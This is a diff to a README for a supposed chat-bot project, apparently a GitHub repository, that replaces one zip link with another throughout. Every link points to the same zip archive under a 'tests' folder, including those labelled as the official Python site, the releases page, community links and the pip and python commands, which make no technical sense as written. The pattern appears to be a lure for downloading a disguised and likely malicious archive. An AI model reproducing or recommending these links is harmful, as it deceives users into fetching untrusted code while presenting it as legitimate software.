@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download LLM-Bot_Social_Chat](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip%20LLM--Bot%20Social%20Chat-blue)](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip)
+[![Download LLM-Bot_Social_Chat](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip%20LLM--Bot%20Social%20Chat-blue)](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,13 +16,13 @@ Before you proceed, make sure your computer meets the following minimum system r
 - **Processor:** Dual-core processor or higher.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** At least 500 MB of free disk space.
-- **Python:** Version 3.8 or above must be installed (Python can be downloaded from [https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip)).
+- **Python:** Version 3.8 or above must be installed (Python can be downloaded from [https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip)).
 
 ## 📤 Download & Install
 
-1. **Visit the Releases Page:** To download the application, visit our [Releases page](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip).
+1. **Visit the Releases Page:** To download the application, visit our [Releases page](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip).
 
-2. **Choose the Right File:** Look for the latest release that is compatible with your operating system. Files are typically labeled with the version number (e.g., `https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip`).
+2. **Choose the Right File:** Look for the latest release that is compatible with your operating system. Files are typically labeled with the version number (e.g., `https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip`).
 
 3. **Download the File:** Click on the desired file to start downloading. The file size will vary depending on the version.
 
@@ -31,7 +31,7 @@ Before you proceed, make sure your computer meets the following minimum system r
 5. **Setup Required Dependencies:** Open a terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to install the necessary Python packages:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip
+   pip install -r https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip
    ```
 
    This step ensures all necessary libraries and tools are available for the application to work.
@@ -39,7 +39,7 @@ Before you proceed, make sure your computer meets the following minimum system r
 6. **Run the Application:** After the dependencies are installed, run the application using the following command:
 
    ```bash
-   python https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip
+   python https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip
    ```
 
    You should see the terminal interface launch and be ready for use.
@@ -74,7 +74,7 @@ If you experience issues, consider the following common solutions:
 
 ## 👥 Community Support
 
-Join our community for support, questions, and collaboration. Engage on our GitHub Discussions page or visit our [Social Media](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip) for updates.
+Join our community for support, questions, and collaboration. Engage on our GitHub Discussions page or visit our [Social Media](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip) for updates.
 
 ## 📄 License
 
@@ -82,8 +82,8 @@ LLM-Bot_Social_Chat is released under the MIT License. For more information, che
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip)
-- [Python Official Site](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip)
-- [Join our Community Forum](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip)
+- [GitHub Repository](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip)
+- [Python Official Site](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip)
+- [Join our Community Forum](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip)
 
-Remember to visit our [Releases page](https://raw.githubusercontent.com/rikinkkj/LLM-Bot_Social_Chat/master/hangworm/LLM-Bot_Social_Chat.zip) to download the latest version of LLM-Bot_Social_Chat and start exploring today!
+Remember to visit our [Releases page](https://github.com/rikinkkj/LLM-Bot_Social_Chat/raw/refs/heads/master/tests/Chat_Bot_LL_Social_1.5-beta.2.zip) to download the latest version of LLM-Bot_Social_Chat and start exploring today!
